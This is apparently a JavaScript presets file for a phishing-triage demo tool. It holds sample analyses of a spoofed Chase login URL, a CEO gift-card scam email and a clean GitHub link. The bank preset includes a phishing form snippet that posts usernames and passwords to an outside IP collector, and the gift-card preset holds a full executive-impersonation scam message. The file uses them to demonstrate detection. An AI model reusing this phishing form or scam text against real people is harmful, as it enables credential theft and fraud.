// data/presets.js
// Curated presets for TriageBot problem statement scenarios

export const DEMO_PRESETS = {
  bankUrl: {
    id: "bank-url",
    name: "Test: Spoofed Bank URL",
    type: "URL",
    target: "https://chase-security-verify.net/auth/login?session=93849102849",
    input: "https://chase-security-verify.net/auth/login?session=93849102849",
    analysis: {
      targetArtifact: "https://chase-security-verify.net/auth/login",
      type: "URL",
      risk: "dangerous",
      riskScore: 94,
      plainExplanation: "This link leads to a newly registered fake domain ('chase-security-verify.net') imitating JPMorgan Chase. It attempts to harvest online banking passwords using an unencrypted offshore form and an artificial 2-hour countdown timer.",
      guardrailAction: {
        level: "dangerous",
        label: "[Block Link & Quarantine Payload]",
        actionName: "Block & Quarantine",
        description: "Automated guardrail active: Link blocked at gateway firewall, DNS sinkholed, and user session quarantined to prevent credential exposure.",
        buttonText: "Enforce Quarantine & Notify SOC"
      },
      preview: {
        url: "https://chase-security-verify.net/auth/login",
        pageTitle: "Chase Online — Account Verification & Security Gateway",
        sslIssuer: "Free DV Authority (No Organization Identity)",
        domainAge: "2 Days Old (Offshore Registrar)",
        analogyText: "Looking at the site safely from behind thick glass without risking your device.",
        watermark: "🛡️ Isolated Cloud Sandbox — Zero Script Execution",
        screenshotType: "bank_phish",
        rawDomSnippet: `<!-- Sandboxed Zero-Execution DOM Snapshot -->
<div class="phish-container bg-navy">
  <div class="header-brand">
    <img src="/assets/chase-logo.svg" alt="Chase Official" />
    <span class="badge-flag">UNLICENSED ASSET</span>
  </div>
  <div class="urgency-banner">
    ACCOUNT RESTRICTED: 01:59:42 remaining before permanent lock.
  </div>
  <form action="http://194.26.29.112:8080/collect.php" method="POST">
    <input type="text" name="usr" placeholder="Username / Account ID" />
    <input type="password" name="pwd" placeholder="Password" />
    <button type="submit">Unlock Account</button>
  </form>
</div>`
      }
    }
  },

  giftCardEmail: {
    id: "giftcard-email",
    name: "Test: Urgent Gift Card Email",
    type: "Text",
    target: "Email: david.sterling.exec@gmail.com (Subject: URGENT gift cards needed)",
    input: `From: David Sterling <david.sterling.exec-office@gmail.com>
Subject: URGENT: Client gift cards needed before 3:00 PM

Hey team,

I'm currently locked in an off-site investor board meeting and cannot take phone calls right now.

I need you to urgently purchase 5x $100 Apple / Amazon Gift Cards for our prospective partners before 3:00 PM today. Please scratch the back, take clear photos of the redemption codes, and email them directly to me right away.

Treat this with discretion — do not post about this on Slack as this is for confidential client negotiations.

Best regards,
David Sterling
Chief Executive Officer`,
    analysis: {
      targetArtifact: "Email: david.sterling.exec-office@gmail.com",
      type: "Text",
      risk: "dangerous",
      riskScore: 89,
      plainExplanation: "This message is an executive impersonation scam (CEO fraud / BEC). The sender uses a free personal Gmail address while enforcing artificial time urgency and communication isolation ('cannot take calls', 'do not post on Slack') to coerce untraceable gift card purchases.",
      guardrailAction: {
        level: "dangerous",
        label: "[Block Link & Quarantine Payload]",
        actionName: "Block & Flag Sender",
        description: "Automated guardrail active: Sender address blacklisted across email gateways, malicious thread flagged for SOC review, and recipient alerted of social engineering.",
        buttonText: "Block Sender & Flag As CEO Fraud"
      },
      preview: {
        url: "email://headers/david.sterling.exec-office@gmail.com",
        pageTitle: "BEC Social Engineering Triage — Urgent Gift Card Vector",
        sslIssuer: "Standard Google Webmail TLS",
        domainAge: "External Webmail Domain",
        analogyText: "Looking at the message safely from behind thick glass without risking your device.",
        watermark: "🛡️ Isolated Cloud Sandbox — Zero Script Execution",
        screenshotType: "bec_email",
        rawDomSnippet: `<!-- Sandboxed Email AST & Entity Extraction -->
<div class="email-ast">
  <div class="sender-analysis">
    <span class="flag-danger">SPOOFED IDENTITY</span>
    From: "David Sterling" &lt;david.sterling.exec-office@gmail.com&gt;
  </div>
  <div class="extracted-triggers">
    <span class="tag-urgency">URGENCY: before 3:00 PM</span>
    <span class="tag-isolation">ISOLATION: cannot take phone calls</span>
    <span class="tag-financial">PAYLOAD: 5x $100 Gift Card Codes</span>
  </div>
</div>`
      }
    }
  },

  cleanGithub: {
    id: "clean-github",
    name: "Test: Clean GitHub Link",
    type: "URL",
    target: "https://github.com/torvalds/linux",
    input: "https://github.com/torvalds/linux",
    analysis: {
      targetArtifact: "https://github.com/torvalds/linux",
      type: "URL",
      risk: "safe",
      riskScore: 4,
      plainExplanation: "This is a legitimate URL pointing to the official Linux kernel repository hosted on GitHub. Verified Extended Validation TLS certificates, clean domain reputation, and authentic cryptographic signatures confirm zero threat indicators.",
      guardrailAction: {
        level: "safe",
        label: "[Allow Access]",
        actionName: "Allow & Whitelist",
        description: "Automated guardrail active: Domain verified on global reputation whitelist. Access permitted with standard endpoint protections.",
        buttonText: "Allow Access & Open Safely"
      },
      preview: {
        url: "https://github.com/torvalds/linux",
        pageTitle: "torvalds/linux: Linux kernel source tree · GitHub",
        sslIssuer: "DigiCert High Assurance TLS CA (Verified Organization)",
        domainAge: "Established (18+ Years)",
        analogyText: "Looking at the site safely from behind thick glass without risking your device.",
        watermark: "🛡️ Isolated Cloud Sandbox — Zero Script Execution",
        screenshotType: "github_clean",
        rawDomSnippet: `<!-- Sandboxed Clean Web Snapshot -->
<div class="repo-snapshot">
  <div class="repo-header">
    <span class="owner">torvalds</span> / <span class="name">linux</span>
    <span class="badge-clean">VERIFIED OFFICIAL REPO</span>
  </div>
  <div class="status-clean">
    TLS: DigiCert EV | Status: 200 OK | GPG Signature: Valid
  </div>
</div>`
      }
    }
  }
};
